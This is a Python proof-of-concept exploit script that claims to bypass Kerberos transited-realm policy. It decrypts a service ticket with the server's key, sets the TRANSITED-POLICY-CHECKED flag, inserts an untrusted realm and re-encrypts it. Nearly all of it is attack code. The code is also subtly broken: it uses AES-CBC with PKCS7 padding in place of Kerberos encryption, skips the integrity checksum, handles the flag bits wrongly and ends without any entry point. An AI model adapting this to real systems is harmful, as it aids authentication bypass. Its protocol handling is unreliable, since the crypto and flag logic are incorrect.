"""
Proof-of-Concept: Transited Policy Check Bypass via Flag Confusion

This script demonstrates a vulnerability in Kerberos implementations where an application
server relies solely on the TRANSITED-POLICY-CHECKED flag to skip validation of the
transited field. By manipulating the flag and the transited field, an attacker can
bypass realm trust policies.

Prerequisites:
- A valid Kerberos ticket (EncTicketPart) to manipulate.
- Knowledge of the server's secret key (for demonstration purposes, e.g., via compromised KDC or key extraction).
- pyasn1, pyasn1-modules, cryptography libraries.

Usage:
python poc_transited_policy_check_bypass.py <ticket_file> <server_key_file>
"""

import sys
import os
from pyasn1.type.univ import Integer, OctetString, Sequence, Set, Null
from pyasn1.codec.der.encoder import encode
from pyasn1.codec.der.decoder import decode
from pyasn1_modules.rfc4120 import (
    Ticket, EncTicketPart, TransitedEncoding, PrincipalName, Realm,
    EncryptionKey, KerberosTime, HostAddresses, AuthorizationData
)
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import struct

# Constants
TRANSITED_POLICY_CHECKED_FLAG = 1 << 12  # Bit 12

# Mock server key for demonstration (In reality, this would be extracted or known)
# This is a placeholder. In a real scenario, you'd load the key from a keytab.
MOCK_SERVER_KEY = b'\x00' * 16  # 128-bit key

# Mock transited field with an untrusted realm
UNTRUSTED_REALM = b'UNTRUSTED.REALM'

def load_ticket(ticket_file):
    """Load a DER-encoded Ticket from a file."""
    with open(ticket_file, 'rb') as f:
        ticket_data = f.read()
    ticket, _ = decode(ticket_data, asn1Spec=Ticket())
    return ticket

def load_key(key_file):
    """Load a server key from a file (raw bytes)."""
    with open(key_file, 'rb') as f:
        return f.read()

def decrypt_ticket_part(ticket, server_key):
    """Decrypt the EncTicketPart using the server key."""
    enc_data = ticket['enc-part']
    encrypted_bytes = bytes(enc_data['cipher'])
    
    # Extract IV and ciphertext
    # Kerberos uses CTS (Cipher Text Stealing) mode, but for simplicity, we'll assume CBC with padding
    # In a real implementation, you'd use the proper CTS mode.
    iv = encrypted_bytes[:16]
    ciphertext = encrypted_bytes[16:]
    
    cipher = Cipher(algorithms.AES(server_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(ciphertext) + decryptor.finalize()
    
    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
    
    enc_ticket_part, _ = decode(decrypted_data, asn1Spec=EncTicketPart())
    return enc_ticket_part

def encrypt_ticket_part(enc_ticket_part, server_key):
    """Encrypt the EncTicketPart using the server key."""
    encrypted_data = encode(enc_ticket_part)
    
    # Add padding
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(encrypted_data) + padder.finalize()
    
    # Generate random IV
    iv = os.urandom(16)
    
    cipher = Cipher(algorithms.AES(server_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    # Prepend IV to ciphertext
    encrypted_bytes = iv + ciphertext
    
    return OctetString(encrypted_bytes)

def manipulate_ticket(ticket, server_key):
    """Manipulate the ticket to bypass transited policy checks."""
    # Step 1: Decrypt the EncTicketPart
    enc_ticket_part = decrypt_ticket_part(ticket, server_key)
    
    # Step 2: Set the TRANSITED-POLICY-CHECKED flag
    flags = enc_ticket_part['flags']
    flags = flags | TRANSITED_POLICY_CHECKED_FLAG
    enc_ticket_part['flags'] = flags
    
    # Step 3: Modify the transited field to include an untrusted realm
    transited = TransitedEncoding()
    transited['tr-type'] = Integer(0)  # 0 means no transited realms, but we'll add one
    transited['contents'] = OctetString(UNTRUSTED_REALM)
    enc_ticket_part['transited'] = transited
    
    # Step 4: Re-encrypt the EncTicketPart
    new_enc_part = encrypt_ticket_part(enc_ticket_part, server_key)
    ticket['enc-part']['cipher'] = new_enc_part
    
    return ticket

